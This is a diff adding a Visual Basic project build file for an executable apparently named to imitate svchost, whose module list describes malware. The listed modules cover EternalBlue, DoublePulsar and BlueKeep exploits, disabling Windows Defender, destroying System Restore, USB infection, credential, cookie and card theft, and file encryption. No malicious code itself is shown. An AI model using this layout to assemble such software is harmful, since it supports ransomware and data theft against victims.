@@ -1,0 +1,163 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{6C9D295B-2E40-4FE6-AB77-34310E320C73}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>svchst</RootNamespace>
+    <AssemblyName>svchst</AssemblyName>
+    <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Main.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <NoWarn>41999,42016,42017,42018,42019,42020,42021,42022,42032,42036,42314</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <NoWarn>41999,42016,42017,42018,42019,42020,42021,42022,42032,42036,42314</NoWarn>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Ionic.Zip" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json" />
+    <Reference Include="SkinSoft.VisualStyler" />
+    <Reference Include="System" />
+    <Reference Include="System" />
+    <Reference Include="System.Configuration.Install" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="My Project\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.vb" />
+    <Compile Include="Costura\AssemblyLoader.vb" />
+    <Compile Include="Main\Config.vb" />
+    <Compile Include="Main\FormBackground.Designer.vb">
+      <DependentUpon>FormBackground.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Main\FormBackground.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Main\FormEncryptedFiles.Designer.vb">
+      <DependentUpon>FormEncryptedFiles.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Main\FormEncryptedFiles.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Main\FormGame.Designer.vb">
+      <DependentUpon>FormGame.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Main\FormGame.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Main\Program.vb" />
+    <Compile Include="Main\Properties\Resources.vb" />
+    <Compile Include="Main\Properties\Settings.Designer.vb">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Main\Tools\Account.vb" />
+    <Compile Include="Main\Tools\AccountType.vb" />
+    <Compile Include="Main\Tools\AntiProcess.vb" />
+    <Compile Include="Main\Tools\AntiSniffer.vb" />
+    <Compile Include="Main\Tools\BaseKey.vb" />
+    <Compile Include="Main\Tools\BitmapToRegion.vb" />
+    <Compile Include="Main\Tools\BlockIo.vb" />
+    <Compile Include="Main\Tools\BlueKeep.vb" />
+    <Compile Include="Main\Tools\BotKiller.vb" />
+    <Compile Include="Main\Tools\Browsers.vb" />
+    <Compile Include="Main\Tools\CardData.vb" />
+    <Compile Include="Main\Tools\Configuration.vb" />
+    <Compile Include="Main\Tools\CookieData.vb" />
+    <Compile Include="Main\Tools\CpuID.vb" />
+    <Compile Include="Main\Tools\Credential.vb" />
+    <Compile Include="Main\Tools\Credentials.vb" />
+    <Compile Include="Main\Tools\Crypto.vb" />
+    <Compile Include="Main\Tools\CryptoClass.vb" />
+    <Compile Include="Main\Tools\c_AntiKill.vb" />
+    <Compile Include="Main\Tools\destroySystemRestore.vb" />
+    <Compile Include="Main\Tools\DisableWindowsDefender.vb" />
+    <Compile Include="Main\Tools\DiskID.vb" />
+    <Compile Include="Main\Tools\DoublePulsar.vb" />
+    <Compile Include="Main\Tools\Email.vb" />
+    <Compile Include="Main\Tools\EternalBlueToolkit.vb" />
+    <Compile Include="Main\Tools\FormData.vb" />
+    <Compile Include="Main\Tools\Geolocation.vb" />
+    <Compile Include="Main\Tools\Hacking.vb" />
+    <Compile Include="Main\Tools\Helper.vb" />
+    <Compile Include="Main\Tools\infectUSBStick.vb" />
+    <Compile Include="Main\Tools\Injector.vb" />
+    <Compile Include="Main\Tools\IpCalculator.vb" />
+    <Compile Include="Main\Tools\LastLogin.vb" />
+    <Compile Include="Main\Tools\Locker.vb" />
+    <Compile Include="Main\Tools\MachineScanResult.vb" />
+    <Compile Include="Main\Tools\Mail.vb" />
+    <Compile Include="Main\Tools\MutexHelper.vb" />
+    <Compile Include="Main\Tools\MyWindowsServiceInstaller.vb" />
+    <Compile Include="Main\Tools\PassData.vb" />
+    <Compile Include="Main\Tools\PKCSKeyGenerator.vb" />
+    <Compile Include="Main\Tools\ProcessKiller.vb" />
+    <Compile Include="Main\Tools\Program.vb" />
+    <Compile Include="Main\Tools\Recovery.vb" />
+    <Compile Include="Main\Tools\RegistryHelper.vb" />
+    <Compile Include="Main\Tools\SqlHandler.vb" />
+    <Compile Include="Main\Tools\SQLiteHandler.vb" />
+    <Compile Include="Main\Tools\startService.vb" />
+    <Compile Include="Main\Tools\UHWIDEngine.vb" />
+    <Compile Include="Main\Tools\USBInfection.vb" />
+    <Compile Include="Main\Tools\UtilitiesProcess.vb" />
+    <Compile Include="Main\Tools\VaultCli.vb" />
+    <Compile Include="Main\Tools\VisitWebSite.vb" />
+    <Compile Include="Main\Tools\Wallpaper.vb" />
+    <Compile Include="Main\Tools\Windows.vb" />
+    <Compile Include="Main\Tools\WindowsID.vb" />
+    <Compile Include="Main\Tools\WinSerial.vb" />
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="ProcessedByFody.vb" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Costura\ionic\zip\dll.compressed" />
+    <EmbeddedResource Include="Costura\newtonsoft\json\dll.compressed" />
+    <EmbeddedResource Include="Costura\skinsoft\visualstyler\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\management\automation\dll.compressed" />
+    <EmbeddedResource Include="Main\FormBackground.resources" />
+    <EmbeddedResource Include="Main\FormEncryptedFiles.resources" />
+    <EmbeddedResource Include="Main\FormGame.resources" />
+    <EmbeddedResource Include="Main\Properties\Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="Main\Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+</Project>
